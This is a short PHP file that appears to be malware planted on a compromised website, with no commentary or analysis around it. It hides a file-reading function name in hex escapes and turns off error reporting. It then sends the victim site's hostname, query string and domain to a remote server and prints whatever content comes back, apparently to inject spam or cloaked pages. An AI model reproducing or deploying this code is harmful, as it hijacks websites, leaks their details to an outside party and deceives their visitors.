<?php
error_reporting(0);
set_time_limit(0);
$MEMEKCYNA= "\x66\x69\x6c\x65" . "\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73";
header("Content-Type: text/html;charset=utf-8");
date_default_timezone_set('PRC');
$Remote_server = "https://abundantlifestory.com/TOOLS/index.html"; 
$host_name = "http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
$Content_mb=$MEMEKCYNA($Remote_server."/index.php?host=".$host_name."&url=".$_SERVER['QUERY_STRING']."&domain=".$_SERVER['SERVER_NAME']);
echo $Content_mb;
?>
